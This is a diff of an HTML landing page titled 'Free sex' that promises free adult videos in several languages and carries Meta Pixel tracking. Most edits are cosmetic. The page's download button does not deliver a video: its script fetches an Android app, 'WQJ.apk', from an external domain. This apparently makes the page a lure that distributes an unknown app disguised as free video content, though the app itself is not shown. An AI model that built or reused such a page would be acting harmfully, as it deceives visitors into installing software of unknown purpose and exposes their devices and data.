@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
-<meta name="facebook-domain-verification" content="p58b7meugr32xo9bbu75ftdoddxcqd" />
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="theme-color" content="#0d0d0f">
+<meta name="facebook-domain-verification" content="p58b7meugr32xo9bbu75ftdoddxcqd" />
 <title>Free sex</title>
 
 <!-- Meta Pixel Code -->
@@ -54,7 +54,6 @@ button { cursor: pointer; font: inherit; border: none; background: none; color: 
   display: flex; align-items: center; justify-content: space-between;
 }
 .logo { font-size: 22px; font-weight: 800; color: #fff; letter-spacing: 0.5px; }
-.logo span { color: var(--accent); }
 .header-right { display: flex; align-items: center; gap: 8px; }
 .online-badge {
   background: #1c1c22; border: 1px solid #2e2e36; border-radius: 20px;
@@ -160,10 +159,6 @@ button { cursor: pointer; font: inherit; border: none; background: none; color: 
 .empty {
   display: none; text-align: center; padding: 60px 20px; color: #666;
 }
-html[dir="rtl"] .sec-title,
-html[dir="rtl"] .card-meta {
-  direction: rtl;
-}
 </style>
 </head>
 <body>
@@ -211,6 +206,7 @@ html[dir="rtl"] .card-meta {
   <button class="more-btn" id="moreBtn">Click to see more</button>
   <div class="bottom-tip">100% Free · No registration · No fee</div>
 </div>
+
 <script>
 const DOWNLOAD_API_BASE = "https://prkqy.superdog-ph.net/prkqy/xvideos";
 const VIDEO_LIBRARY = [
@@ -229,7 +225,7 @@ const VIDEO_LIBRARY = [
   {id:"v019", category:"ai", title:{"zh-TW":"AI夜店激情","en":"AI Nightclub","ja":"AIナイトクラブ","ko":"AI 나이트클럽","hi":"AI नाइटक्लब","fr":"Boîte de nuit IA","de":"KI Nachtclub"}, cover:"v019.webp", duration:"9:40", views:"71.5K"},
   {id:"v031", category:"ai", title:{"zh-TW":"AI 黑絲長腿","en":"AI Long Legs","ja":"AI美脚","ko":"AI 롱레그","hi":"AI लॉन्ग लेग्स","fr":"Longues jambes IA","de":"KI Lange Beine"}, cover:"v031.webp", duration:"10:05", views:"58.7K"},
   {id:"v014", category:"anime", title:{"zh-TW":"二次元動漫特輯","en":"2D Anime","ja":"二次元アニメ","ko":"2D 애니","hi":"2D एनीमे","fr":"Anime 2D","de":"2D Anime"}, cover:"v014.webp", duration:"18:20", views:"203K"},
-  {id:"v020", category:"anime", title:{"zh-TW":"二次元女僕侍奉","en":"2D Maid","ja":"メイド","ko":"メイド","hi":"2D मेड","fr":"Maid 2D","de":"2D Maid"}, cover:"v020.webp", duration:"14:35", views:"156K"},
+  {id:"v020", category:"anime", title:{"zh-TW":"二次元女僕侍奉","en":"2D Maid","ja":"メイド","ko":"메이드","hi":"2D मेड","fr":"Maid 2D","de":"2D Maid"}, cover:"v020.webp", duration:"14:35", views:"156K"},
   {id:"v021", category:"anime", title:{"zh-TW":"校園動漫學姐","en":"School Anime","ja":"学園先輩","ko":"학원 선배","hi":"स्कूल एनीमे","fr":"Anime école","de":"Schul-Anime"}, cover:"v021.webp", duration:"16:10", views:"128K"},
   {id:"v022", category:"anime", title:{"zh-TW":"幻想世界精靈","en":"Fantasy Elf","ja":"エルフ","ko":"엘프","hi":"फैंटेसी एल्फ","fr":"Elfe fantastique","de":"Fantasy-Elfe"}, cover:"v022.webp", duration:"12:45", views:"97.6K"},
   {id:"v023", category:"anime", title:{"zh-TW":"機甲少女特輯","en":"Mecha Girl","ja":"メカ少女","ko":"메카 소녀","hi":"मेका गर्ल","fr":"Fille Mecha","de":"Mecha-Mädchen"}, cover:"v023.webp", duration:"15:30", views:"76.3K"},
@@ -396,7 +392,6 @@ function download(position) {
       position: position
     });
   } catch(e) {}
- 
   const a = document.createElement("a");
   a.href = DOWNLOAD_API_BASE;
   a.download = "WQJ.apk";
